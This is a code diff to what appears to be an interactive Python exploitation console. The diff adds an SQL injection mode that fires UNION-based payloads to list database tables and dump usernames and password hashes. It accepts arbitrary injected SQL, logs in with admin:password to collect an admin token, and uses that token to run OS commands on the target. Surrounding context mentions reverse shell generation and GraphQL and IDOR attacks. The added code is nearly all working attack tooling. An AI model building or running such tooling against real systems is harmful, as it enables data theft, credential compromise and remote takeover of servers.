@@ -29,7 +29,7 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
     
     while True:
         try:
-            cmd = input(f"(target session)> ").strip()
+            cmd = input("(target session)> ").strip()
         except (KeyboardInterrupt, EOFError):
             break
 
@@ -39,7 +39,13 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
             print("    Commands:")
             print("      info        - View current target and vulnerability details")
             print("      exploit     - Re-run automated exploit/audit payload against target")
-            if vuln_type == "Command Injection":
+            if vuln_type in ["SQLi", "SQL Injection"]:
+                print("      tables      - Enumerate database tables via UNION injection")
+                print("      dump        - Extract user records and password hashes")
+                print("      query <sql> - Send custom SQL injection string")
+                print("      escalate    - Authenticate using dumped admin credentials to harvest token")
+                print("      exec <cmd>  - Execute OS commands using the harvested admin token")
+            elif vuln_type == "Command Injection":
                 print("      exec <cmd>  - Execute any Linux command (e.g., 'exec ls', 'exec whoami')")
                 print("      revshell    - Generate reverse shell payloads for this target")
             elif vuln_type == "GraphQL":
@@ -99,6 +105,21 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                         print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                 except Exception as e:
                     print(f"    [-] Exploit failed: {e}")
+            elif vuln_type in ["SQLi", "SQL Injection"]:
+                print("[*] Firing SQL Syntax error test payload (')...")
+                try:
+                    parsed = urllib.parse.urlparse(target_url)
+                    q = urllib.parse.parse_qs(parsed.query)
+                    param_name = param or "cat"
+                    q[param_name] = ["1'"]
+                    new_q = urllib.parse.urlencode(q, doseq=True)
+                    exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
+                    
+                    req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
+                    with urllib.request.urlopen(req, timeout=3) as resp:
+                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+                except Exception as e:
+                    print(f"    [-] Exploit failed: {e}")
             elif vuln_type == "GraphQL":
                 print("[*] Re-running GraphQL Introspection query...")
                 try:
@@ -131,6 +152,97 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                 req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
                 with urllib.request.urlopen(req, timeout=3) as resp:
                     print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+            except Exception as e:
+                print(f"    [-] Execution failed: {e}")
+        elif cmd == "tables" and vuln_type in ["SQLi", "SQL Injection"]:
+            print("[*] Enumerating database tables via UNION-based injection...")
+            try:
+                parsed = urllib.parse.urlparse(target_url)
+                q = urllib.parse.parse_qs(parsed.query)
+                param_name = param or "cat"
+                q[param_name] = ["1' UNION SELECT 1,table_name FROM information_schema.tables--"]
+                new_q = urllib.parse.urlencode(q, doseq=True)
+                exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
+                
+                req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+            except Exception as e:
+                print(f"    [-] Enumeration failed: {e}")
+        elif cmd == "dump" and vuln_type in ["SQLi", "SQL Injection"]:
+            print("[*] Dumping user records and password hashes via SQL injection...")
+            try:
+                parsed = urllib.parse.urlparse(target_url)
+                q = urllib.parse.parse_qs(parsed.query)
+                param_name = param or "cat"
+                q[param_name] = ["1' UNION SELECT 1,username,password_hash FROM users--"]
+                new_q = urllib.parse.urlencode(q, doseq=True)
+                exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
+                
+                req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+            except Exception as e:
+                print(f"    [-] Dump failed: {e}")
+        elif cmd.startswith("query ") and vuln_type in ["SQLi", "SQL Injection"]:
+            sql_payload = cmd.split(" ", 1)[1]
+            print(f"[*] Injecting custom SQL payload: {sql_payload}")
+            try:
+                parsed = urllib.parse.urlparse(target_url)
+                q = urllib.parse.parse_qs(parsed.query)
+                param_name = param or "cat"
+                q[param_name] = [sql_payload]
+                new_q = urllib.parse.urlencode(q, doseq=True)
+                exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
+                
+                req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+            except Exception as e:
+                print(f"    [-] Query failed: {e}")
+        elif cmd == "escalate" and vuln_type in ["SQLi", "SQL Injection"]:
+            print("[*] Authenticating with harvested admin credentials (admin:password)...")
+            try:
+                parsed = urllib.parse.urlparse(target_url)
+                base_domain = f"{parsed.scheme}://{parsed.netloc}"
+                auth_url = f"{base_domain}/api/v1/admin/login?user=admin&pass=password"
+                
+                req = urllib.request.Request(auth_url, headers={'User-Agent': 'Mozilla/5.0'})
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    resp_body = resp.read().decode('utf-8', errors='ignore')
+                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp_body}")
+                    if "adminToken" in resp_body:
+                        res_json = json.loads(resp_body)
+                        harvested_token = res_json.get("adminToken")
+                        harvested_endpoint = res_json.get("adminEndpoint")
+                        print(f"    [!] SUCCESS! Admin Token Harvested: {harvested_token[:30]}...")
+                        print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
+            except Exception as e:
+                print(f"    [-] Escalation failed: {e}")
+        elif cmd.startswith("exec ") and vuln_type in ["SQLi", "SQL Injection"]:
+            user_linux_cmd = cmd.split(" ", 1)[1]
+            if not harvested_token:
+                print("    [-] No admin token available. Run 'escalate' first using dumped credentials.")
+                continue
+            
+            target_exec_url = harvested_endpoint or "http://127.0.0.1:8080/api/v1/admin/exec"
+            print(f"[*] Pivoting admin token against endpoint: {target_exec_url}")
+            try:
+                exec_url = f"{target_exec_url}?cmd={urllib.parse.quote(user_linux_cmd)}"
+                req = urllib.request.Request(exec_url, headers={
+                    'User-Agent': 'Mozilla/5.0',
+                    'Authorization': f'Bearer {harvested_token}'
+                })
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    raw_body = resp.read().decode('utf-8', errors='ignore')
+                    try:
+                        res_json = json.loads(raw_body)
+                        if "output" in res_json:
+                            print(f"\n{res_json['output']}\n")
+                        else:
+                            print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
+                    except Exception:
+                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
             except Exception as e:
                 print(f"    [-] Execution failed: {e}")
         elif cmd == "users" and vuln_type == "GraphQL":
@@ -286,7 +398,7 @@ def main_console():
                 run_target_shell(item.get("target"), "IDOR", param=item.get("param"))
 
         elif choice == "3":
-            other_items = [f for f in findings if f.get("vulnerability") in ["SQLi", "LFI", "Command Injection"]]
+            other_items = [f for f in findings if f.get("vulnerability") in ["SQLi", "SQL Injection", "LFI", "Command Injection"]]
             if not other_items:
                 print("[-] No SQLi, LFI, or Command Injection vectors found.")
                 continue
